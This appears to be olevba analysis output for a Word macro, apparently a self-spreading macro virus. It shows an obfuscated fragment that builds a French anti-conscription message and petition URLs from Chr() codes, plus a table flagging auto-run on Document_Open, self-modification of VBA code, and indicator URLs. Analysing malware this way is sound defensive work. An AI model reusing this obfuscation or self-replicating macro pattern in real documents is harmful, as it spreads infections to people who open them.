Chr(32) + "environ" + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "jeunes" + Chr(32) + "citoyens," + Chr(32) + "sursitaires," + Chr(32) + "à" + Chr(32) + "devoir" + Chr(32) ' zgtxqdzagpti
c1 = c1 + "effectuer" + Chr(32) + "notre" + Chr(32) + "service" _
+ Chr(32) + "militaire." + Chr(32) + "250" + Chr(32) + "000" + Chr(32) + "étudiants," + Chr(32) + "salariés," + Chr(32) + "rêveurs," + Chr(32) ' ivbd
c1 = c1 + "entrepreneurs," + Chr(32) + "chômeurs," + Chr(32) + "voyageurs": b2 = Chr(32) + "ou" + Chr(32) + "tout" + Chr(32) + "simplement" + Chr(32) + "amoureux" + Chr(32) + _
"qui" + Chr(32) + "ont" + Chr(32) + "d" + Chr(39) + "autres" + Chr(32) + "projets" + Chr(32) + "de" + _
Chr(32) + "Vie" + Chr(32) ' ibbxlm
b2 = b2 + "pour" + Chr(32) + "ces" + Chr(32) + "10" + Chr(32) _
+ "mois." + Chr(32) + "Ils" + Chr(32) + "refusent" + Chr(32) + "d" + Chr(39) + "effectuer" + Chr(32) + "un" _
+ Chr(32) + _
"service" + Chr(32) + "inégalitaire" + Chr(32) ' xbmsdb
b2 = b2 + "et" + Chr(32) + "dépassé," + Chr(32) + "bref" + Chr(32) + "un" + Chr(32) + "service" + Chr(32) + "qui" + Chr(32) + "ne" + Chr(32) + "sert" + Chr(32) + "plus" + Chr(32) + "rien.": b1 = "Mobilisons-nous" + Chr(32) + "!" + Chr(13) + _
Chr(13) + "Pétition" + Chr(32) _
+ "pour" + Chr(32) + "les" + Chr(32) + "sursitaires" + Chr(32) + _
"sous" + Chr(32) + "contrat" + Chr(32) + "de" + Chr(32) + "travail:" ' fdvmsdipq
b1 = b1 + Chr(32) + "http://sn.agat.net" + Chr(13) + "La" + Chr(32) + "révolte" + Chr(32) + "du" + Chr(32) + "service" + Chr(32) _
+ "militaire:" + Chr(32) + _
"http://altern.org/gigm/service.htm" + Chr(13): a1 = "La" + Chr(32) + "pétition" + Chr(32) + "du" + Chr(32) + "magazine" + Chr(32) + "Don" + Chr(32) + "Quichotte:" _
+ Chr(32) + _
"http://www.donquichotte.com" + Chr(13) + "Non" + Chr(32) + "au" + Chr(32) + "S.N." ' voxubmswmkqiw
a1 = a1 + Chr(32) + "qui" + Chr(32) + "tue" + Chr(32) + "l" + Chr(39) + "emploi:" + Chr(32) + "http://www.multimania.com/antisn": e4 = Chr(80) + Chr(114) + Chr(105) + Chr(118) + Chr(97) + Chr(116) + Chr(101) ' migbs
j17 = Chr(69) + Chr(110) _
+ Chr(100): c7 = Chr(69) + Chr(110) + Chr(100) + Chr(32) + Chr(83) + Chr(117) + Chr(98): End Sub ' fcwhujezhorom

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|environ             |May read system environment variables        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://sn.agat.net  |URL                                          |
|IOC       |http://altern.org/gi|URL                                          |
|          |gm/service.htm      |                                             |
|IOC       |http://www.donquicho|URL                                          |
|          |tte.com             |                                             |
|IOC       |http://www.multimani|URL                                          |
|          |a.com/antisn        |                                             |
+----------+--------------------+---------------------------------------------+

